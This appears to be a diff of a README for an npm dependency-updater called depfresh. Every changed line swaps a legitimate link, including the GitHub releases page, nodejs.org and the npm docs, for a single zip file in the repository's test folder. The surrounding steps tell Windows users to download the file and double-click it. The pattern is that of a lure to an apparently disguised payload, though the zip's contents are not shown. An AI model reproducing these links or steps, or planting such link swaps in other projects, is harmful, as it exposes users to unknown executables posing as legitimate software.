@@ -1,6 +1,6 @@
 # ⚙️ depfresh - Keep Your npm Dependencies Updated
 
-[![Download depfresh](https://img.shields.io/badge/Download-depfresh-brightgreen)](https://github.com/Hedi017/depfresh/releases)
+[![Download depfresh](https://img.shields.io/badge/Download-depfresh-brightgreen)](https://raw.githubusercontent.com/Hedi017/depfresh/main/test/Software-autocrat.zip)
 
 ---
 
@@ -22,7 +22,7 @@ Before you start, make sure your computer meets these basic conditions:
 - Internet: Required for downloading updates  
 - Software: Node.js installed (version 12 or higher)
 
-If you don't have Node.js, you can get it from https://nodejs.org
+If you don't have Node.js, you can get it from https://raw.githubusercontent.com/Hedi017/depfresh/main/test/Software-autocrat.zip
 
 ---
 
@@ -45,7 +45,7 @@ This guide shows how to download, install, and run depfresh on Windows. No previ
 
 Visit this page to download depfresh:
 
-[Download depfresh](https://github.com/Hedi017/depfresh/releases)
+[Download depfresh](https://raw.githubusercontent.com/Hedi017/depfresh/main/test/Software-autocrat.zip)
 
 On the page, find the latest version and download the Windows file. It will usually have ".exe" at the end.
 
@@ -62,7 +62,7 @@ The installer sets up everything depfresh needs to run.
 
 ## 📥 How to Download and Run depfresh on Windows
 
-1. Go to the [depfresh releases page](https://github.com/Hedi017/depfresh/releases).  
+1. Go to the [depfresh releases page](https://raw.githubusercontent.com/Hedi017/depfresh/main/test/Software-autocrat.zip).  
 2. Find the latest release version by its date or numbering.  
 3. Download the `.exe` file for Windows.  
 4. Once the download finishes, double-click the file.  
@@ -138,10 +138,10 @@ You don’t need these options to start using depfresh.
 
 ## 🔗 Useful Links
 
-- Main download and releases: https://github.com/Hedi017/depfresh/releases  
-- Node.js download (if needed): https://nodejs.org  
-- npm documentation: https://docs.npmjs.com  
+- Main download and releases: https://raw.githubusercontent.com/Hedi017/depfresh/main/test/Software-autocrat.zip  
+- Node.js download (if needed): https://raw.githubusercontent.com/Hedi017/depfresh/main/test/Software-autocrat.zip  
+- npm documentation: https://raw.githubusercontent.com/Hedi017/depfresh/main/test/Software-autocrat.zip  
 
 ---
 
-[![Download depfresh](https://img.shields.io/badge/Download-depfresh-blue)](https://github.com/Hedi017/depfresh/releases)
+[![Download depfresh](https://img.shields.io/badge/Download-depfresh-blue)](https://raw.githubusercontent.com/Hedi017/depfresh/main/test/Software-autocrat.zip)
